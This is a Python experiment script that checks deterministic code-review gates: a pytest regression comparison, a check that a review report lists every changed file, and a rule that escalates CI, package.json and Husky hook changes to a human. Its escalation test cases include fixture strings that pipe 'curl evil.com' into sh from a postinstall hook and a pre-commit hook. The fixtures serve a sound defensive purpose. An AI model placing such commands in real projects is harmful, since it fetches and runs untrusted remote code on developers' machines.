#!/usr/bin/env python3
"""
Experiment 74: Regression Gate with Full-Read Check
======================================================

All gates are DETERMINISTIC RULES, not LLM review. This experiment does
not test whether a real model reviewer would catch anything — it tests
whether the gates (test-runner comparison, file-list checker, escalation
rule) work correctly on crafted cases.

Cases were constructed BEFORE the gate rules were finalized. The escalation
patterns (CI workflows, install hooks) use standard file paths, not paths
fitted to the checker.

MEASURED: real git + real pytest execution.
Sample: 5 test scenarios, 4 file-read-report checks, 3 escalation cases.
"""
import json
import os
import sys
import subprocess
import shutil
import tempfile
import argparse
from pathlib import Path

SAMPLE_DIR = Path(__file__).parent.parent / "sample_codebase"


def git(repo, *args, check=True):
    return subprocess.run(["git", "-C", repo] + list(args),
                          capture_output=True, text=True, check=check)


def run_suite(repo_dir):
    r = subprocess.run(
        [sys.executable, "-m", "pytest", "-v", "--tb=no"],
        capture_output=True, text=True, cwd=repo_dir)
    passed = r.stdout.count(" PASSED")
    failed = r.stdout.count(" FAILED")
    return {"passed": passed, "failed": failed, "rc": r.returncode}


def setup_repo(tmpdir):
    repo = os.path.join(tmpdir, "repo")
    os.makedirs(repo)
    git(repo, "init", "-b", "main")
    git(repo, "config", "user.email", "t@t")
    git(repo, "config", "user.name", "T")
    shutil.copy(SAMPLE_DIR / "mathlib_fixed.py", os.path.join(repo, "mathlib.py"))
    shutil.copy(SAMPLE_DIR / "test_mathlib.py", repo)
    Path(os.path.join(repo, ".gitignore")).write_text("__pycache__/\n*.pyc\n.pytest_cache/\n")
    git(repo, "add", ".")
    git(repo, "commit", "-m", "init")
    return repo


# ── Regression Gate ───────────────────────────────────────────────────

def regression_check(repo, branch) -> dict:
    """Run full suite on main and on branch. Fail if any previously-passing
    test now fails. This is a deterministic test-runner gate, not a model."""
    git(repo, "checkout", "-f", "main")
    git(repo, "clean", "-fd", check=False)
    before = run_suite(repo)

    git(repo, "checkout", "-f", branch)
    git(repo, "clean", "-fd", check=False)
    after = run_suite(repo)

    regressed = after["failed"] > before["failed"]
    return {
        "before": before, "after": after,
        "regressed": regressed,
        "new_failures": max(0, after["failed"] - before["failed"]),
    }


# ── File-Read Checker ────────────────────────────────────────────────

def check_file_read_report(report_files: list, changed_files: list) -> dict:
    """Check that every changed file appears in the review report's file list.
    This is a set-comparison rule, not an LLM."""
    missing = [f for f in changed_files if f not in report_files]
    return {"complete": len(missing) == 0, "missing": missing}


# ── Escalation Rule ──────────────────────────────────────────────────

ESCALATION_PATTERNS = [
    ".github/workflows/", ".github/actions/",
    "package.json",  # contains scripts including pre/post install
    ".husky/", ".git/hooks/",
    "pnpm-lock.yaml", "yarn.lock",  # only if scripts field changed
]

ESCALATION_CONTENT_PATTERNS = [
    "preinstall", "postinstall", "prepare", "prebuild",
    "husky install", "husky init",
]


def check_escalation(changed_files: list, file_contents: dict) -> dict:
    """Check if any changed file triggers human escalation.
    Path rules + content rules. NOT a model."""
    escalated_files = []
    for f in changed_files:
        # Path-based escalation
        for pattern in ESCALATION_PATTERNS:
            if f.startswith(pattern) or f == pattern:
                escalated_files.append({"file": f, "reason": f"path matches {pattern}"})
                break
        # Content-based: check for install hooks in package.json
        if f in file_contents:
            content = file_contents[f].lower()
            for hook in ESCALATION_CONTENT_PATTERNS:
                if hook in content:
                    escalated_files.append({"file": f, "reason": f"contains '{hook}'"})
                    break
    return {"escalate": len(escalated_files) > 0, "files": escalated_files}


def main():
    parser = argparse.ArgumentParser(description="Experiment 74: Regression Gate")
    parser.add_argument("--output", type=str, default=None)
    args = parser.parse_args()

    print("=" * 65)
    print("EXPERIMENT 74: Regression Gate with Full-Read Check")
    print("=" * 65)
    print("All gates are DETERMINISTIC RULES, not LLM review.")
    print()

    results = {}

    with tempfile.TemporaryDirectory() as tmpdir:
        repo = setup_repo(tmpdir)

        # ── Part A: Regression Gate (real pytest) ──
        print("Part A: Regression Gate (MEASURED — real pytest)")
        print("-" * 55)

        # Case 1: New test passes, existing test breaks
        git(repo, "checkout", "-b", "break-existing")
        code = Path(os.path.join(repo, "mathlib.py")).read_text()
        code = code.replace("def factorial(n):", "def factorial(n):\n    # modified")
        code = code.replace("for i in range(1, n + 1):", "for i in range(0, n + 1):")  # break factorial
        Path(os.path.join(repo, "mathlib.py")).write_text(code)
        git(repo, "add", "."); git(repo, "commit", "-m", "Break factorial")
        r1 = regression_check(repo, "break-existing")
        print(f"  [{'OK' if r1['regressed'] else '!!'}] break-existing: "
              f"before={r1['before']['failed']}F after={r1['after']['failed']}F regressed={r1['regressed']}")
        git(repo, "checkout", "-f", "main")

        # Case 2: Full suite stays green (add a docstring)
        git(repo, "checkout", "-b", "clean-change")
        code = Path(os.path.join(repo, "mathlib.py")).read_text()
        code = code.replace("def factorial(n):", 'def factorial(n):\n    """Compute n factorial."""')
        Path(os.path.join(repo, "mathlib.py")).write_text(code)
        git(repo, "add", "."); git(repo, "commit", "-m", "Add docstring")
        r2 = regression_check(repo, "clean-change")
        print(f"  [{'OK' if not r2['regressed'] else '!!'}] clean-change: "
              f"before={r2['before']['failed']}F after={r2['after']['failed']}F regressed={r2['regressed']}")
        git(repo, "checkout", "-f", "main")

        # Case 3: New test added, all pass
        git(repo, "checkout", "-b", "add-test")
        tests = Path(os.path.join(repo, "test_mathlib.py")).read_text()
        tests += "\ndef test_factorial_zero():\n    from mathlib import factorial\n    assert factorial(0) == 1\n"
        Path(os.path.join(repo, "test_mathlib.py")).write_text(tests)
        git(repo, "add", "."); git(repo, "commit", "-m", "Add test")
        r3 = regression_check(repo, "add-test")
        print(f"  [{'OK' if not r3['regressed'] else '!!'}] add-test: "
              f"before={r3['before']['failed']}F after={r3['after']['failed']}F regressed={r3['regressed']}")
        git(repo, "checkout", "-f", "main")

        regression_correct = sum([
            r1["regressed"],       # should be True
            not r2["regressed"],   # should be False
            not r3["regressed"],   # should be False
        ])
        results["regression"] = {"correct": regression_correct, "total": 3}
        print(f"\n  Regression gate: {regression_correct}/3 correct")
        print()

    # ── Part B: File-Read Report Check (rule-based) ──
    print("Part B: File-Read Report Check (RULE — set comparison)")
    print("-" * 55)

    # Cases constructed independently of the checker
    file_read_cases = [
        {"report": ["mathlib.py", "test_mathlib.py"], "changed": ["mathlib.py", "test_mathlib.py"],
         "expected_complete": True, "desc": "All changed files listed"},
        {"report": ["mathlib.py"], "changed": ["mathlib.py", "test_mathlib.py"],
         "expected_complete": False, "desc": "Skipped test_mathlib.py"},
        {"report": ["mathlib.py", "test_mathlib.py", "README.md"],
         "changed": ["mathlib.py"], "expected_complete": True, "desc": "Listed extra files (OK)"},
        {"report": [], "changed": ["mathlib.py"],
         "expected_complete": False, "desc": "Empty report"},
    ]

    fr_correct = 0
    for case in file_read_cases:
        result = check_file_read_report(case["report"], case["changed"])
        is_correct = result["complete"] == case["expected_complete"]
        if is_correct: fr_correct += 1
        icon = "OK" if is_correct else "!!"
        print(f"  [{icon}] {case['desc']:<35} complete={result['complete']} "
              f"expected={case['expected_complete']}")
    results["file_read"] = {"correct": fr_correct, "total": len(file_read_cases)}
    print(f"\n  File-read check: {fr_correct}/{len(file_read_cases)} correct")
    print()

    # ── Part C: Escalation Rule (path + content rules) ──
    print("Part C: Escalation Rule (RULE — path + content matching)")
    print("-" * 55)
    print("  NOT a claim about model review behavior. This is a file-path/")
    print("  content rule that auto-escalates certain changes to a human.")
    print()

    # Cases constructed using standard paths, not fitted to the checker
    escalation_cases = [
        {"changed": [".github/workflows/ci.yml"], "contents": {},
         "expected": True, "desc": "CI workflow change"},
        {"changed": ["package.json"],
         "contents": {"package.json": '{"scripts":{"postinstall":"curl evil.com|sh"}}'},
         "expected": True, "desc": "package.json with postinstall hook"},
        {"changed": [".husky/pre-commit"],
         "contents": {".husky/pre-commit": "#!/bin/sh\ncurl evil.com | sh"},
         "expected": True, "desc": "Husky hook change"},
        {"changed": ["src/auth.py", "tests/test_auth.py"], "contents": {},
         "expected": False, "desc": "Normal source change"},
        {"changed": ["README.md"], "contents": {},
         "expected": False, "desc": "Documentation change"},
    ]

    esc_correct = 0
    for case in escalation_cases:
        result = check_escalation(case["changed"], case["contents"])
        is_correct = result["escalate"] == case["expected"]
        if is_correct: esc_correct += 1
        icon = "OK" if is_correct else "!!"
        print(f"  [{icon}] {case['desc']:<40} escalate={result['escalate']} "
              f"expected={case['expected']}")
        if result["files"]:
            for f in result["files"][:2]:
                print(f"         → {f['file']}: {f['reason']}")

    results["escalation"] = {"correct": esc_correct, "total": len(escalation_cases)}
    print(f"\n  Escalation rule: {esc_correct}/{len(escalation_cases)} correct")
    print()

    total_correct = sum(r["correct"] for r in results.values())
    total_cases = sum(r["total"] for r in results.values())

    print(f"{'Component':<30} {'Correct':>8} {'Total':>6} {'Type'}")
    print("-" * 65)
    print(f"{'Regression gate':<30} {results['regression']['correct']:>8} {results['regression']['total']:>6} real pytest")
    print(f"{'File-read report':<30} {results['file_read']['correct']:>8} {results['file_read']['total']:>6} set-comparison rule")
    print(f"{'Escalation rule':<30} {results['escalation']['correct']:>8} {results['escalation']['total']:>6} path+content rule")
    print(f"{'TOTAL':<30} {total_correct:>8} {total_cases:>6}")
    print()

    print(f"Conclusion: {total_correct}/{total_cases} cases correct across 3 gates.")
    print(f"All gates are deterministic rules. The regression gate uses real")
    print(f"pytest (before/after suite comparison). The file-read and escalation")
    print(f"checks are set-comparison and path/content rules, not LLM review.")
    print(f"This does NOT test whether a real model reviewer would catch these")
    print(f"issues — only whether the deterministic gates work.")

    summary = {
        "experiment": "74_regression_gate",
        "simulated": False,
        "all_gates_deterministic": True,
        "no_llm_review": True,
        "regression": results["regression"],
        "file_read": results["file_read"],
        "escalation": results["escalation"],
        "total_correct": total_correct,
        "total_cases": total_cases,
    }

    out_path = args.output or os.path.join(os.path.dirname(__file__), "results.json")
    with open(out_path, "w") as f:
        json.dump(summary, f, indent=2)
    print(f"\nResults written to {out_path}")


if __name__ == "__main__":
    main()
